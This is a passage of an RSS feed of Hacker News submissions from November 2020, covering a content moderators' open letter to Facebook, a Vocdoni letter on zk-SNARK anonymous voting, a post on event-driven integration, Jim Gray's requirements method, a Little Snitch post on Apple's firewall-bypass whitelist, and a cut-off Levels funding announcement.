crisis highlights that at the core of Facebook’s business lies a deep hypocrisy. By outsourcing our jobs, Facebook implies that the 35,000 of us who work in moderation are somehow peripheral to social media. Yet we are so integral to Facebook’s viability that we must risk our lives to come into work. </p><p>It is time to reorganize Facebook’s moderation work on the basis of equality and justice. We are the core of Facebook’s business. We deserve the rights and benefits of full Facebook staff. We look forward to your public response. </p><p>Very sincerely yours, </p><ul data-rte-list="default"><li><p>Andrea</p></li><li><p>Angela De Hoyos Hart</p></li><li><p>Ani Niow</p></li><li><p>Audrey Martin</p></li><li><p>Aune Mitchell</p></li><li><p>Azer Gueco</p></li><li><p>Baris Aytan</p></li><li><p>Brady Bennett</p></li><li><p>Cam Herringshaw</p></li><li><p>Carlin Scrudato</p></li><li><p>Carlos Ancira</p></li><li><p>Charles Maxwell</p></li><li><p>Chris Chan</p></li><li><p>Christopher Glenn</p></li><li><p>Claire Sexton</p></li><li><p>Crystal Chan</p></li><li><p>Danica Michaels</p></li><li><p>Daniel Baxley</p></li><li><p>Daniel Finlayson</p></li><li><p>Daniel Rezende Fuser</p></li><li><p>Danille Sindac</p></li><li><p>Diego Ramirez</p></li><li><p>Dominick Martinez</p></li><li><p>Douglas Hart</p></li><li><p>Erin Donohue</p></li><li><p>Fletcher West</p></li><li><p>Hua Hoai Nam</p></li><li><p>James J. Morrow</p></li><li><p>Jeremy Calvert</p></li><li><p>Jess L</p></li><li><p>Jessica den Boer</p></li><li><p>John Reese</p></li><li><p>John Royales McTurk</p></li><li><p>Jonathan Daniel</p></li><li><p>Jonathan de la Rosa</p></li><li><p>Joseph Pouttu</p></li><li><p>Joseph Sarhan</p></li><li><p>Joshua Sklar</p></li><li><p>Katie Adamsky</p></li><li><p>Kelly Lambert</p></li><li><p>Kevin Fei</p></li><li><p>Kevin Liao</p></li><li><p>Kiara Gaytan</p></li><li><p>Lucy Yang</p></li><li><p>Marcus Rodriguez</p></li><li><p>Maria Sam</p></li><li><p>Mark Reitblatt</p></li><li><p>Mayra Ota Coffey</p></li><li><p>Michael Thot</p></li><li><p>Mike Vitousek</p></li><li><p>Naomi Shiffman</p></li><li><p>Nathan Tokala</p></li><li><p>Niccolo Coluccio</p></li><li><p>Nicholas O'Brien</p></li><li><p>Nick Azcarate</p></li><li><p>Nick Martens</p></li><li><p>Noah Korotzer</p></li><li><p>Nuno Picareta</p></li><li><p>Palina Andrayuk </p></li><li><p>Phil Wills</p></li><li><p>Phillip Shih</p></li><li><p>Phong Vu</p></li><li><p>Purnam Jantrania</p></li><li><p>Raimonds Gabalis</p></li><li><p>Ramazan Sahin</p></li><li><p>Rena</p></li><li><p>Robert Boyce</p></li><li><p>Ryan Hoyt</p></li><li><p>Sam Ringel</p></li><li><p>Sara Valderrama</p></li><li><p>Sarah Dunn</p></li><li><p>Shom Mazumder</p></li><li><p>Steffan Voges</p></li><li><p>Stephanie Marina</p></li><li><p>Stuart Millican</p></li><li><p>Tariq Yusuf</p></li><li><p>Thi Cat Tuong Trinh</p></li><li><p>Tina Wall</p></li><li><p>Tom G</p></li><li><p>Tristam MacDonald</p></li><li><p>Vahid Liaghat</p></li><li><p>Vitor Cordeiro Pileggi</p></li><li><p>Zoya Waliany</p></li><li><p><em>(and a further  248 content moderators who’ve signed anonymously)</em></p></li></ul><p><br>[1] <a href="https://www.vice.com/en/article/z3vvv9/leaked-audio-facebook-moderators-terrifiedto-return-to-office-during-covid-outbreak">https://www.vice.com/en/article/z3vvv9/leaked-audio-facebook-moderators-terrifiedto-return-to-office-during-covid-outbreak </a><br>[2] <a href="https://www.vox.com/2020/4/29/21241601/facebook-coronavirus-pandemic-usersadvertising-growth-making-losing-money-users-q1-2020-earnings">https://www.vox.com/2020/4/29/21241601/facebook-coronavirus-pandemic-usersadvertising-growth-making-losing-money-users-q1-2020-earnings </a><br>[3] <a href="https://www.theguardian.com/business/2020/sep/17/wealth-of-us-billionaires-rises-bynearly-a-third-during-pandemic">https://www.theguardian.com/business/2020/sep/17/wealth-of-us-billionaires-rises-bynearly-a-third-during-pandemic </a><br>[4] <a href="https://www.irishtimes.com/business/retail-and-services/cpl-agrees-318m-takeover-byjapan-s-outsourcing-inc-1.4399832">https://www.irishtimes.com/business/retail-and-services/cpl-agrees-318m-takeover-byjapan-s-outsourcing-inc-1.4399832</a> <br>[5] <a href="https://www.glassdoor.co.uk/Salaries/austin-content-moderator-salarySRCH_IL.0,6_IM60_KO7,24.htm">https://www.glassdoor.co.uk/Salaries/austin-content-moderator-salarySRCH_IL.0,6_IM60_KO7,24.htm </a><br>[6]<a href="https://theintercept.com/2020/10/20/facebook-coronavuris-content-moderatoraccenture/"> https://theintercept.com/2020/10/20/facebook-coronavuris-content-moderatoraccenture/ </a><br>[7] <a href="https://www.politico.eu/article/facebook-content-moderation-automation">https://www.politico.eu/article/facebook-content-moderation-automation</a></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.foxglove.org.uk/news/open-letter-from-content-moderators-re-pandemic</link>
            <guid isPermaLink="false">hacker-news-small-sites-25142657</guid>
            <pubDate>Wed, 18 Nov 2020 21:27:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Not that bad: Open letter to MIT Digital Currency Initiative on anonymous voting]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25142587">thread link</a>) | @ferran_vocdoni
<br/>
November 18, 2020 | https://blog.vocdoni.io/zk-openletter-digital-currency/ | <a href="https://web.archive.org/web/*/https://blog.vocdoni.io/zk-openletter-digital-currency/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


                <figure>
                    <img srcset="https://blog.vocdoni.io/content/images/size/w300/2020/11/-blog--zk-SNARKS-header.png 300w,
                                https://blog.vocdoni.io/content/images/size/w600/2020/11/-blog--zk-SNARKS-header.png 600w,
                                https://blog.vocdoni.io/content/images/size/w1200/2020/11/-blog--zk-SNARKS-header.png 1000w,
                                https://blog.vocdoni.io/content/images/size/w2000/2020/11/-blog--zk-SNARKS-header.png 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 1170px,
                                2000px" src="https://blog.vocdoni.io/content/images/size/w2000/2020/11/-blog--zk-SNARKS-header.png" alt="It's not that bad: Open letter to MIT Digital Currency Initiative on anonymous voting">
                </figure>
                <section>
                    <div>
                        <p>‌</p><blockquote> The following text is an open letter from Pau Escrich and the rest of the Vocdoni Team to <code>"Going from Bad to Worse: From Internet Voting to Blockchain Voting"</code> draft paper published on November 6th, 2020 by The Digital Currency Initiative of MIT Medialab.<br>Retrieve it here: <a href="https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf">https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf</a></blockquote><p>Dear Neha, Sunoo, Michael, Ronald,</p><p>Vocdoni is a Free and Libre open source project building a digital voting infrastructure that is universally verifiable, decentralized, scalable and anonymous.</p><p>This project represents a new paradigm for digital voting as compared to existing solutions which rely solely on a blockchain for vote traceability, employ closed-source software and even operate as a centralized service.</p><p>When reading your recent paper [1], we found that it addresses many of the very important problems and challenges that many e-voting solutions have. We believe, however, that the paper is missing some recent and crucial developments to the field of digital voting, such as those proposed by Vocdoni.</p><p>We have designed a decentralized voting platform [2] that is not only attack-resistant and universally-verifiable but also enables voter anonymity with the use of zk-SNARKs technology. We believe our design would solve some of the most important problems listed in the paper.</p><p>Regarding Zero Knowledge, the paper states the following:</p><blockquote>First, a digital-only solution does nothing to prevent physical monitoring by coercers or vote buyers. Secondly, zero-knowledge proofs are designed for a setting where the party with secret information wants to keep it secret (that’s why they’re using zero-knowledge proofs) — they generally do not prevent that party from revealing information voluntarily.</blockquote><p>At Vocdoni we are working on a series of developments that overcome these concerns.</p><p>In its current development stage, our system anonymizes voters' census inclusion proofs which are submitted with their votes. The content of each vote, however, is still publicly available and verifiable. This means the choices on each ballot can be known, but an outsider cannot link this ballot to any individual voter. (It's important to note that, in addition to the vote anonymity, the sense of the vote might be temporarily encrypted with a set of cryptographic keys revealed at the end of the election).</p><p>With regards to coercion attacks, our current zk-SNARKs circuit [3] already reduces the attack surface by leveraging the following methods:</p><ol><li>When an election ends, a set of keys (commit and reveal keys in the circuit schema) is revealed by multiple trusted parties. Using these keys, anyone can generate a valid ZK-proof, which would be indistinguishable from a legitimate voter's proof. This secondary proof could only be used to manipulate an election in the case that all trusted keyholding parties collaborated maliciously.</li><li>During an election, users can replace their vote as many times as they wish.</li></ol><p>These measures do not altogether rule out the possibility of an attack; before the election ends, a user could still exhibit their vote to a third party in exchange for a bounty. A buyer would need this user to prove that their vote is associated with a given nullifier on the Vochain. Such a vote-buying system would be complex, but feasible, to scale.</p><p>In order to achieve complete anti-coercion while keeping our design principles, we visualize two possile schemes for digital vote anonymity in the not-so-distant future:</p><h3 id="zk-rollups">Zk-Rollups</h3><p>As ZK-Rollups become computationally viable, they could also be used to achieve ballot content anonymization.</p><p>In this scenario a voter would send their vote to a private network rather than a public Blockchain. A private ZK-Rollup service(s) connected to this network would aggregate user ZK-Proofs and votes, and compute a valid cryptographic proof to verify:</p><ul><li>the list of vote nullifiers</li><li>the election Process identifier</li><li>the census Root Hash</li><li>the results of the vote batch</li></ul><p>The ZK-Rollup proof would then be sent to a public ledger containing the batch data. Any voter would be able to validate the inclusion of their vote by querying their own nullifier. The individual ballot's content would never be publicly available, but the result (computed inside the zk-SNARKs circuit) would be verifiable (otherwise the ZK-Proof would be invalid).</p><p>More details on the ZK-Rollup proposal can be found here [4].</p><h3 id="homomorphic-encryption">Homomorphic encryption</h3><p>Another alternative would be the use of homomorphic encryption on top of zk-SNARKs, anonymizing the vote content in addition to the already anonymized census inclusion proof.</p><p>In this scenario, the content of a ballot would be encrypted and directly added to the last currently encrypted result aggregation (without decrypting). Some homomorphic schemas also allow for verification that an encrypted ballot is valid for a set of rules (i.e not larger than N).</p><p>These are only small pieces of the paradigm shift we're trying to trigger for digital voting. If you feel engaged by following the discussion with us, we would be delighted to continue the conversation.</p><p>[1] <a href="https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf">https://people.csail.mit.edu/rivest/pubs/PSNR20.pdf</a><br>‌‌[2] <a href="https://docs.vocdoni.io/">https://docs.vocdoni.io</a>‌‌<br>[3] <a href="https://docs.vocdoni.io/#/architecture/protocol/franchise-proof">https://docs.vocdoni.io/#/architecture/protocol/franchise-proof</a><br>‌‌[4] <a href="https://docs.vocdoni.io/#/architecture/protocol/franchise-proof?id=zk-rollups-proposal-for-anti-coercion-scalable-and-deterministic-execution">https://docs.vocdoni.io/#/architecture/protocol/franchise-proof?id=zk-rollups-proposal-for-anti-coercion-scalable-and-deterministic-execution</a></p><hr><p>To join the conversation and know more about Vocdoni <a href="https://docs.vocdoni.io/">check our Technical Architecture</a>, follow us on <a href="https://twitter.com/vocdoni">Twitter</a> and <a href="http://discord.gg/sQCxgYs">join our Discord Server</a>.</p>
                    </div>
                </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://blog.vocdoni.io/zk-openletter-digital-currency/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25142587</guid>
            <pubDate>Wed, 18 Nov 2020 21:19:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Moving from Batch to Real Time Improves the Customer Experience]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25142486">thread link</a>) | @benjaminwootton
<br/>
November 18, 2020 | https://timeflow.systems/how-moving-from-batch-to-real-time-improves-the-customer-experience/ | <a href="https://web.archive.org/web/*/https://timeflow.systems/how-moving-from-batch-to-real-time-improves-the-customer-experience/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<ul>
							<li>
								<span>Posted On:</span>
								September 07, 2020 
							</li>
							<li>  </li>
						</ul>
<h2>
	
						
						How Moving From Batch To Real Time Improves The Customer Experience	</h2>
						
<p>Over time, the typical business acquires more and more applications. Some will be bespoke, some off the shelf, some cloud hosted SaaS tools and some in the data centre.</p>



<p>Frequently, business requirements will arise where these applications need to be integrated. For instance, every time an order is placed on our eCommerce website, a customer record should be created in the CRM system, the marketing system, and the ERP system.</p>



<p>As companies add more and more of these integrations, they end up with a spaghetti of bespoke interconnections and data exchanges which looks something like this:</p>



<figure><img loading="lazy" width="1024" height="846" src="https://timeflow.systems/wp-content/uploads/2020/09/map-1024x846.png" alt="" srcset="https://timeflow.systems/wp-content/uploads/2020/09/map-1024x846.png 1024w, https://timeflow.systems/wp-content/uploads/2020/09/map-300x248.png 300w, https://timeflow.systems/wp-content/uploads/2020/09/map-768x634.png 768w, https://timeflow.systems/wp-content/uploads/2020/09/map.png 1057w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>These integration points have historically been developed in one of three ways:</p>



<ol><li>API Integration – When the e-commerce system records a new customer, the ERP and marketing systems are called in real time to create the record. This is the gold standard for moving data around in real time, but it does couple the systems together very tightly, so we have to worry about keeping APIs compatible so that we do not break upstream and downstream systems.</li><li>Batch Data Integration – Because of the complexity and effort involved in developing and managing point to point APIs, most information is exchanged between applications as batches. Every 24 hours or so, information is extracted from one system, uploaded to another as a data file, and imported into the destination. This is referred to as extract, transform and load.</li><li>Message Based Integration – As things happen in the source system, messages are transferred from the source to destination over an intermediary message queue. This is almost real time, and does decouple the systems somewhat, so is probably the optimal solution as of today, though it does have implications for how your source and destination systems are designed and built.</li></ol>



<p>Though event based architecture and messaging platforms such as Kafka are the solution to this mess, the problem is that most businesses are built on batch integration and unreliable point to point APIs. Though it’s hard to know, I would say the split is 70% batch, 20% point to point APIs and 10% messaging in the large enterprises that I am familiar with.</p>



<p>The problem is that when we run too many integration jobs with delayed and unreliable foundations, this leaks through to impact the customer experience. Take these frustrating interactions with your bank for instance:</p>



<ul><li>Online banking being slow to update as you make transactions;</li><li>Delays before a requested statement is sent out or a letter issued;</li><li>Delays in opening accounts and being onboarded as a customer;</li><li>Being passed between different call centre departments and having to explain your request over again;</li></ul>



<p>Slow and unreliable batch data exchange is likely to be at the heart of these frustrating experiences.</p>



<p>Now compare this to the Neo Banks who have experiences such as the below, where push notifications arrive on your phone the instant you swipe your debit card in a store:</p>



<p>This shows that the payment event is instantly flowing through the system and immediately enhancing the user experience with no batch processing. This still makes me smile now as I know the amount of technology required to make it happen. I think the fact that startup banks can do this seemingly simple thing should be concerning for the incumbents as it demonstrates that they are built on real time foundations.</p>



<p>To build these user experiences, companies need to implement an event driven architecture and move away from batch integration, point to point APIs towards real time streaming. This does go deeper than just modernising how you implement your applications, as discussed in this video.</p>



<figure><p>
<iframe title="Event Driven Architecture" width="640" height="360" src="https://www.youtube.com/embed/V5jwqDs8FRw?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>I believe that the move to event driven architectures and real time messaging are absolutely at the heart of the transformation that enterprises need to make. If we are building on batch integration, it is very hard to build personalised and responsive customer experiences, and hard to introduce intelligent automation and proactive use of data into business processes.</p>

											</div></div>]]>
            </description>
            <link>https://timeflow.systems/how-moving-from-batch-to-real-time-improves-the-customer-experience/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25142486</guid>
            <pubDate>Wed, 18 Nov 2020 21:11:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jim Gray's “20 Questions” requirements gathering]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25142411">thread link</a>) | @tacon
<br/>
November 18, 2020 | http://www.stccmop.org/blog/bill_howe/repost_20_questions_requirements_gathering | <a href="https://web.archive.org/web/*/http://www.stccmop.org/blog/bill_howe/repost_20_questions_requirements_gathering">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page-wrapper"><div id="page">

  <!-- /.section, /#header -->

  <div id="main-wrapper"><div id="main">

    <div id="content"><div>
            <h2>You are here</h2>      
                                
                        <div id="node-909">

  
      
  
      <p>
      Submitted by <a href="http://www.stccmop.org/user/bill_howe" title="View user profile.">Bill Howe</a> on November 1, 2007 - 3:41pm    </p>
  
  <div>
    <div><div><div><p><a href="http://research.microsoft.com/~Gray/">Jim Gray</a>, a Turing award winning computer science researcher at Microsoft Research, has used a "20 questions" methodology to gather data management requirements from scientists in <a href="http://www.sdss.org/">Astronomy</a>, <a href="http://lifeunderyourfeet.org/en/default.asp">Ecology</a>, <a href="http://research.microsoft.com/research/pubs/view.aspx?msr_tr_id=MSR-TR-2005-49">Materials Engineering</a>, and <a href="http://research.microsoft.com/~Gray/">more</a>.  Each of these efforts led to very successful projects.</p>
<p>The idea is this:  You all, collectively, provide 20 science questions about your data that are difficult or cumbersome to answer using existing software.  I take those 20 questions and your data and design an online system that can answer each one.</p>
<p>For example, for the Sloan Digital Sky Survey project, the astronomers provided the following questions about their telescope data (among others):</p>
<ol>
<li>Find all galaxies without unsaturated pixels within 1' of a given point of ra=75.327, dec=21.023</li>
<li> Find all galaxies with blue surface brightness between and 23 and 25 mag per square arcseconds, and -10<super galactic="" latitude="" (sgb)="" <10,="" and="" declination="" less="" than="" zero.<="" li="">
</super></li><li>Find all galaxies brighter than magnitude 22, where the local extinction is &gt;0.75. </li>
<li>Find galaxies with an isophotal surface brightness (SB) larger than 24 in the red band, with an ellipticity&gt;0.5, and with the major axis of the ellipse having a declination of between 30” and 60”arc seconds.</li>
<li> Find all galaxies with a deVaucouleours profile (r¼ falloff of intensity on disk) and the photometric colors consistent with an elliptical galaxy.  The deVaucouleours profile </li>
<li>Find galaxies that are blended with a star, output the deblended galaxy magnitudes. </li>
<li> Provide a list of star-like objects that are 1% rare.</li>
<li> Find all objects with unclassified spectra. </li>
<li> Find quasars with a line width &gt;2000 km/s and 2.5<redshift<2.7. <="" li="">
</redshift<2.7.></li><li> Find galaxies with spectra that have an equivalent width in Ha &gt;40Å (Ha is the main hydrogen spectral line.) </li>
<p>Bill </p>
<p>References:</p>
<p>Alexander S. Szalay, Peter Kunszt, Ani Thakar, Jim Gray, Don Slutz, Robert J. Brunner, <a href="http://research.microsoft.com/~gray/Papers/MS_TR_99_30_Sloan_Digital_Sky_Survey.doc?0sr=p">Designing and Mining Multi-Terabyte Astronomy Archives: The Sloan Digital Sky Survey</a>, Technical Report, MS-TR-99-30</p>
<p>Jim Gray; Alex Szalay<a href="http://research.microsoft.com/research/pubs/view.aspx?tr_id=815">Where the Rubber Meets the Sky: Bridging the Gap between Databases and Science</a>, Technical Report, MSR-TR-2004-110</p>
</ol></div></div></div>  </div>

  <ul><li><a href="http://www.stccmop.org/blogs/bill_howe" title="Read Bill Howe's latest blog entries.">Bill Howe's blog</a></li>

</ul>
  
</div> <!-- /.node -->
              </div></div><!-- /.section, /#content -->

          <!-- /.section, /#navigation -->
    
      <!-- /.section, /.region -->

      <!-- /.section, /.region -->

  </div></div> <!-- /#main, /#main-wrapper -->

  
  
       <!-- /.section, /#footer -->
  
</div></div></div>]]>
            </description>
            <link>http://www.stccmop.org/blog/bill_howe/repost_20_questions_requirements_gathering</link>
            <guid isPermaLink="false">hacker-news-small-sites-25142411</guid>
            <pubDate>Wed, 18 Nov 2020 21:04:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple backtracking on network filter whitelist]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25142321">thread link</a>) | @heyoni
<br/>
November 18, 2020 | https://blog.obdev.at/a-hole-in-the-wall/ | <a href="https://web.archive.org/web/*/https://blog.obdev.at/a-hole-in-the-wall/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
        <article>
            
            

            <section>
                <!--kg-card-begin: image--><figure><img src="https://blog.obdev.at/content/images/2020/11/hole-in-the-wall.png"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p><a href="https://apple.com/privacy">Apple on Privacy</a>:</p>
<blockquote>
<p>Privacy is a fundamental human right. At Apple, it’s also one of our core values. Your devices are important to so many parts of your life. <strong>What you share from those experiences, and who you share it with, should be up to you. We design Apple products to protect your privacy and give you control over your information.</strong> It’s not always easy. But that’s the kind of innovation we believe in.</p>
</blockquote>
<p>We could not agree more. That’s why we created Little Snitch in the first place, 18 years ago.</p>
<p>It is your right to know where your computer connects to. To whom it talks. It’s your right to see these connections. It’s your right to allow them. And it’s your right to deny them.</p>
<p>That’s our philosophy. You should always be able to see what’s going on and to make informed decisions.</p>
<p>When we first discovered that Apple’s new Network Extension Framework — that all third party firewalls are now required to use on macOS Big Sur<sup><a href="#fn1" id="fnref1">[1]</a></sup> — didn’t report network traffic during some large software update download, we reported this bug to Apple on July 1 (FB7839544), hoping it would be fixed in the final version of Big Sur.</p>
<p>But it came worse. Three months later we realized, that a number of other Apple services like App Store, Maps or FaceTime also showed this strange behavior of acting invisibly, bypassing the new filter API. So we reported our new findings again on October 1 (FB8762834).</p>
<p>As it turned out, this behavior is on purpose. There’s an <a href="https://www.obdev.at/support/littlesnitch/245914647368270">explicit whitelist</a> that allows certain macOS services to bypass any third party firewalls and to communicate on the Internet without being even noticed by the user. A hole in the wall.</p>
<p>It is understandable, that some network connections are essential for a secure and smooth system operation. It makes sense to <a href="https://blog.jacopo.io/en/post/apple-ocsp">check the validity of signing certificates</a> to effectively protect against malware attacks. It makes sense to download critical security updates in a timely fashion to prevent malware from exploiting vulnerabilities that have already been fixed. Blocking such connections would usually cause more harm than good.</p>
<p>But hiding these connections completely from the user makes no sense. It contradicts the idea of a transparent and trustworthy system and undermines the user’s trust in that system.</p>
<p>We’ve been facing similar challenges in Little Snitch as well. If we allow users to block each and every network connection, they might inadvertently render their computer unusable, causing DNS lookups to hang, preventing users from logging into their accounts and more.</p>
<p>How did we solve it? By being transparent and informative. By telling users about the possible consequences that the denial of certain connections might have, and in some cases recommending them not to do so. By providing default firewall rules to allow a few essential connections, but still letting users opt out. By developing the <a href="https://obdev.at/iap/">Internet Access Policy</a> that also gives third party developers the possibility to explain, which connections their apps are about to make, and whether it’s OK or not to deny them.</p>
<p>But the final decision whether to accept the possible consequences should always be left to the user, to you.</p>
<p>In the light of the recent public discussions that this topic has triggered we are extremely confident that Apple stands by their word to give users control over their information and will therefore eliminate this kind of whitelisting in a future macOS update.</p>
<p>Just yesterday Apple announced their willingness to address such privacy concerns by improving the way how online certificate checks are performed, and even <a href="https://support.apple.com/en-us/HT202491">adding the possibility to completely opt out of these security protections</a>.</p>
<p>Until then we won’t be restless either. We are already working on an alternative technique how to make even those currently hidden connections visible again in Little Snitch in one of our next updates. Looks very promising so far!</p>
<p>So stay tuned and protect your privacy. It’s yours, after all.</p>
<p>Credits: Image by clipground.com licensed under <a href="https://creativecommons.org/licenses/by/4.0">CC BY 4.0</a></p><hr>
<section>
<ol>
<li id="fn1"><p>Apple has <a href="https://support.apple.com/en-us/HT210999">discontinued the support of Network Kernel Extensions in macOS Big Sur</a>. Developers must therefore rewrite their apps to use Apple’s Network Extension Framework instead. <a href="#fnref1">↩︎</a></p>
</li>
</ol>
</section>
<!--kg-card-end: markdown-->
            </section>

             
                
            
        </article>
    </div></div>]]>
            </description>
            <link>https://blog.obdev.at/a-hole-in-the-wall/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25142321</guid>
            <pubDate>Wed, 18 Nov 2020 20:54:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Levels Announces $12M Seed Round]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25141664">thread link</a>) | @troydavis
<br/>
November 18, 2020 | https://www.levelshealth.com/blog/levels-raises-12m-investment-round-improve-metabolic-health-wearables | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/levels-raises-12m-investment-round-improve-metabolic-health-wearables">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>Levels raises $12M seed round led by a16z to bring biowearables into the mainstream and improve metabolic health and fitness.</p></div><div><div><div><div data-bg="https://cdn.shortpixel.ai/client/q_glossy,ret_img/https://www.levelshealth.com/wp-content/uploads/2020/10/bessi-profile.png"> <img alt="" src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%2032%2032%22%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/f012ae590d34c5f989e71fc16a7c1731?s=32&amp;d=mm&amp;r=g" data-srcset="https://secure.gravatar.com/avatar/f012ae590d34c5f989e71fc16a7c1731?s=64&amp;d=mm&amp;r=g 2x" height="32" width="32"></div></div></div></div><div id="featured-image-single-v"> <img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.33-AM.png" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.46.33-AM.png" aria-label="Levels announces $12M seed round"></div><div id="single-content-content"><p><em>Levels Community:&nbsp;</em></p><p><i>We’re thrilled to share the following announcement about an exciting step in Levels’ mission to bring better metabolic health to the world. This round of seed funding not only gives us the resources to keep improving the Levels experience and reach more people, </i><i>but also demonstrates the shared belief across the investor community that real-time biometrics are the key to unlocking lasting behavior change and long-term health.</i><i> In fact, we heard so many positive things from this all-star group of early funders, we included a few of our favorite quotes at the bottom of the release. Thank you for your early support.</i><i></i></p><p><i>With health,</i><i><br> </i><i>The Levels Team</i></p><hr><h2><span>Levels Raises $12M Seed Round to Bring Biowearables into the Mainstream and Improve Metabolic Health</span></h2><h3><i><span>Category-Defining Biowearable System Provides Real-Time Glucose Data to Optimize Diet, Improve Performance, and Accelerate Recovery&nbsp;</span></i></h3><p><span>NEW YORK, NOVEMBER </span><span>17</span><span>, 2020 — </span><a href="https://www.levelshealth.com/"><span>Levels</span></a><span>, the </span><span>first biowearable system to provide real-time feedback on how your diet impacts your health</span><span>, today announced a $12 million seed round led by </span><a href="https://a16z.com/"><span>a16z</span></a><span>, one of Silicon Valley’s top venture capital firms whose portfolio includes Airbnb, Facebook, Instagram, Lyft, Pinterest, Slack, Stripe and Waymo. The round also includes participation from angel investors including Marc Randolph (co-founder and first CEO of Netflix), Dick Costolo (former CEO of Twitter), Michael Arrington (Founder of TechCrunch), and Matt Dellavedova (NBA, Cleveland Cavaliers).</span></p><p><span>In the same way fitness trackers are commonly worn to quantify physical activity and exercise, Levels measures the impact of one’s diet and lifestyle on metabolic health by pairing continuous glucose monitoring (CGM) technology with intelligent software.&nbsp;</span></p><p><span>“You shouldn’t need a PhD in nutrition or human physiology to know what to eat for lunch. Levels is the first product that takes the guesswork out of daily lifestyle choices with personalized, objective data,” said Josh Clemente, Levels Founder and President. “By leveraging continuous glucose monitoring, Levels helps users close the loop between overall health and daily choices around food, exercise, sleep, and stress management to support long-term metabolic health.”</span></p><p><img src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_285/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-285x400.png" data-src="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_285/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-285x400.png" alt="" width="285" height="400" data-srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_285/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-285x400.png 285w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_143/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-143x200.png 143w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_502/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM.png 502w" data-sizes="(max-width: 285px) 100vw, 285px" srcset="https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_285/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-285x400.png 285w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_143/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM-143x200.png 143w, https://cdn.shortpixel.ai/client/q_glossy,ret_img,w_502/https://www.levelshealth.com/wp-content/uploads/2020/11/Screen-Shot-2020-11-17-at-12.47.26-AM.png 502w"></p><p><a href="https://www.liebertpub.com/doi/10.1089/met.2018.0105"><span>Only 12% of the U.S. population is considered metabolically healthy</span></a><span>. Today, over 120 million Americans have prediabetes or diabetes, and </span><a href="https://www.cdc.gov/diabetes/basics/prediabetes.html"><span>84% of people with prediabetes don’t even know they have it</span></a><span>. Levels published their </span><a href="http://levels.link/plan"><span>Secret Master Plan</span></a><span> to explain how they’ll reverse this trend </span><a href="https://www.levelshealth.com/blog/the-levels-theory-of-behavior-change"><span>by promoting behavior change based on personal data</span></a><span>.</span></p><p><span>“We invested in Levels because metabolic dysfunction is an incredibly important problem, and their rate of execution on solving this problem is on par with the best companies we’ve seen,” said Jeff Jordan, Managing Partner, a16z. “Consumers are increasingly health conscious, and increasingly leverage real tech tools and data to improve their health. Levels provides a veritable ‘divining rod’ for improved metabolic health.”</span></p><p><span>The month-long Levels program includes two 14-day CGM sensors and access to the Levels app, which provides real-time analysis on how food, exercise, and other lifestyle decisions are impacting your health. Currently in a closed beta, Levels has a 50,000+ person waitlist and will be available for consumer purchase in early 